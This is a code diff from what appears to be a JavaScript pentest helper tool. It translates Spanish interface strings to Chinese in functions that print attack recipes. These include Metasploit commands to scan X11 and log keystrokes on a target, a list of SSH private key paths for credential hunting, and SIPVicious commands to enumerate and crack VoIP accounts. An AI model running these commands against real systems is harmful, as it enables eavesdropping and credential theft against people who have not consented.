@@ -759,7 +759,7 @@ function runUnsecuredCredentials() {
         lines.push('  Home: ' + esc(target));
         lines.push('═'.repeat(50));
         lines.push('');
-        lines.push('  Referencia: MITRE ATT&CK T1552');
+        lines.push('  参考: MITRE ATT&CK T1552');
         lines.push('');
         var categories = {
             ssh: {n: 'SSH Keys', paths: ['~/.ssh/id_rsa', '~/.ssh/id_ed25519', '~/.ssh/authorized_keys'], risk: 'Permisos 0644 en privadas'},
@@ -904,28 +904,28 @@ function runKeylogger() {
         lines.push('═'.repeat(50));
         lines.push('');
         lines.push('📌 Xspy via Metasploit');
-        lines.push('   Instalar: sudo apt install metasploit-framework');
+        lines.push('   Instalar: Kali Linux自带 metasploit-framework');
         lines.push('');
-        lines.push('🔧 Paso 1: Escanear puerto X11');
+        lines.push('🔧 步骤 1: 扫描 X11 端口');
         lines.push(codeBlock('msfconsole'));
         lines.push(codeBlock('use auxiliary/scanner/x11/open_x11'));
         lines.push(codeBlock('set rhosts ' + target));
         lines.push(codeBlock('run'));
         lines.push('');
-        lines.push('🔧 Paso 2: Capturar teclado');
+        lines.push('🔧 步骤 2: 键盘记录');
         lines.push(codeBlock('use auxiliary/gather/x11_keyboard_spy'));
         lines.push(codeBlock('set rhosts ' + target));
         lines.push(codeBlock('set rport ' + port));
         lines.push(codeBlock('set LISTENER_TIMEOUT ' + timeout));
         lines.push(codeBlock('run'));
         lines.push('');
-        lines.push('📝 Notas:');
-        lines.push('   • LISTENER_TIMEOUT 0 = escucha permanente');
-        lines.push('   • PRINTERVAL ajusta el intervalo de salida');
-        lines.push('   • El target debe tener el puerto X11 abierto (6000 por defecto)');
+        lines.push('📝 备注:');
+        lines.push('   • LISTENER_TIMEOUT 0 = 永久监听');
+        lines.push('   • PRINTERVAL 设置输出间隔');
+        lines.push('   • 需目标开放 X11 端口（默认 6000）');
         lines.push('');
         lines.push('─'.repeat(50));
-        lines.push('⚠️ Solo monitorea sistemas que te pertenezcan');
+        lines.push('⚠️ 仅监控你有权的系统');
         setOutput('keyloggerResult', lines.join('<br>'));
     }, 400);
 }
@@ -975,7 +975,7 @@ function runVoipCredentialAccess() {
             t.c.forEach(function(cmd) { lines.push(codeBlock(cmd)); });
             lines.push('');
         });
-        lines.push('🔧 Flujo recomendado:');
+        lines.push('🔧 推荐流程:');
         lines.push(codeBlock('sipvicious_svmap ' + target));
         lines.push(codeBlock('sipvicious_svwar -e100-999 ' + target));
         lines.push(codeBlock('sipvicious_svcrack -u' + (user || '100') + ' -r1-9999 ' + target));
